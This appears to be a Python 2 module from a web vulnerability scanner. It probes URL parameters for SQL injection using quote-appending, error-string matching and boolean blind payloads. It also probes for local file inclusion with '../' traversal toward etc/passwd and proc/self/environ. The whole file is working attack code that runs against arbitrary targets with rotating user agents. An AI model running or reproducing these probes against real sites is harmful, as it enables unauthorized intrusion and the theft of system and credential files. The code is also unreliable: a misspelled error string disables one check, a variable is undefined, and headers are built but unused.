from header import *

def check_sql_vuln(url):
	sql_timeout = 10
	if("http" not in url):
		url = "http://%s" %url

	rand = randint(0,9)
	headers = {'User-Agent':agents[rand%len(agents)]}
	ourl = url
	vuln = None
	path = []

	if("=" in url):
		for x in range(0,len(ourl)):
			if(url[x] == '='):
				tmp = ourl[:(x+1)]
				x += 1
				while(x < len(ourl) and ourl[x] != '&'):
					tmp += ourl[x]
					x += 1
				path.append(tmp)

	for x in range(0,len(path)):
		ourl = path[x]
		url = ourl+"'"

		try:
			try:
				print "[*] Testing %s" %url
				r = requests.get(ourl, timeout=sql_timeout)
				r1 = requests.get(url, timeout=sql_timeout)
			except ConnectionError:
				print "..Trying connection a second (and last) time.."
				r = requests.get(ourl, timeout=sql_timeout)
				r1 = requests.get(url,timeout=sql_timeout)

			if(r.status_code == 200 and "You have an error in your SQL syntax" not in r.text):
				if(r1.status_code == 200 and "You have an error in your SQL syntax" in r1.text):
					vuln = "MySQLi"
			if(vuln is None and r.status_code == 200 and "Microsoft OLE DB Provider for SQL Server error" not in r.text):
				if(r1.status_code == 200 and "Microsoft OLE DB Provider for SQL Server error" in r1.text):
					vuln = "MSSQLi"
			if(vuln is None and r.status_code == 200 and "Application raised an exception class ADODB_Exception with message" not in r.text):
				if(r1.status_code == 200 and "Application raised an exception class ADODB_Exception with message" in r1.text 
					and "postgres" in r1.text and "error" in r1.text):
					vuln = "PGSQLi"
			if(vuln is None and r.status_code == 200 and "Microsoft JET Database Engine error" not in r.text):
				if(r1.status_code == 200 and "Microsoft JET Dtabase Engine error" in r1.text):
					vuln = "MSAccess SQLi"
			if(vuln is None and r1.status_code == 200 and r1.url == url and (len(r.text)-len(r1.text)) > 50 and "Page Not Found" not in r1.text):
				vuln = "Possible SQLi"

			if(vuln is None or vuln == "Possible SQLi"):
				rd = requests.get(ourl, timeout=sql_timeout)
				# Blind SQL Injection
				if(r.text == rd.text):
					s = "%s AND 1=1" %ourl
					s1 = "%s AND 1=2" %ourl
					print "[*] Testing %s" %s
					ur = requests.get(s, timeout=sql_timeout)
					ud = requests.get(s1, timeout=sql_timeout)
					if(len(ur.text)-len(ud.text) >= 50 and ((ur.url == s and ud.url == s1) 
						or (ur.url != s and ud.url == s1) or (ur.url == s and ud.url == s1))):
						vuln = "Blind SQLi"
					else:
						s = "%s+AND+1::int=1" %ourl
						s1 = "%s+AND+1::int=2" %ourl
						print "[*] Testing %s" %s
						ur = requests.get(s, timeout=sql_timeout)
						ud = requests.get(s1, timeout=sql_timeout)
						if(len(ur.text)-len(ud.text) >= 50 and ((ur.url == s and ud.url == s1) 
							or (ur.url != s and ud.url == s1) or (ur.url == s and ud.url == s1))):
							vuln = "Blind SQLi"

			if(vuln != None):
				myPrint("\n[%s]      %s\n" %(vuln,ourl), "white")		
		except Exception as e:
			print e
			pass
	
	if(vuln is None):
		print "\n[SQLi - CLEAN]      %s" %(ourl)
	return vuln


def check_lfi_vuln(url):
	LFI_TIMEOUT = 10

	if("http" not in url):
		url = "http://%s" %url

	rand = randint(0,9)
	headers = {'User-Agent':agents[rand%len(agents)]}
	myurl = ""
	paths = []
	lfi_files = ["etc/passwd","etc/group","proc/self/environ"]
	lfi_paths = []

	if("=" in url and "?" in url):
		for x in range(0,len(url)):
			if(url[x] == '='):
				path = url[:(x+1)]
				for lfi_file in lfi_files:
					lfi_paths.append(path+"/"+lfi_file)
				for lfi_file in lfi_files:
					tmp = "../"
					for i in range(0,13):
						lfi_paths.append(path+tmp+lfi_file)
						tmp = "%s../" %tmp

	lfi_found = False
	for lfi_path in lfi_paths:
		try:
			#print "Testing %s" %lfi_path
			r = requests.get(lfi_path, headers=headers, timeout=LFI_TIMEOUT)
			content = r.text

			if(r.status_code == 200):
				if("[<a href='function.main'>function.main</a>" not in content
		        	and "[<a href='function.include'>function.include</a>" not in content
		        	and ("Failed opening" not in content and "for inclusion" not in content)
		        	and "failed to open stream:" not in content
		        	and "open_basedir restriction in effect" not in content
		        	and ("root:" in content or ("sbin" in content and "nologin" in content)
		            or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or "/usr/sbin/nologin" in content 
		            or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
		            or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
		            or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
		            or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
		            or ("error]" in content and "[client" in content and "log" in website)
		            or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
		            or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content) and "/proc/self/status" in path))):
					myPrint("\n[LFI vuln] '%s'\n" %lfi_path, "white")
					lfi_found = True
					break
		except Exception as e:
			print e
			pass

	if(lfi_found is False):
		myPrint("\n[LFI - CLEAN] '%s'\n" %url, None)


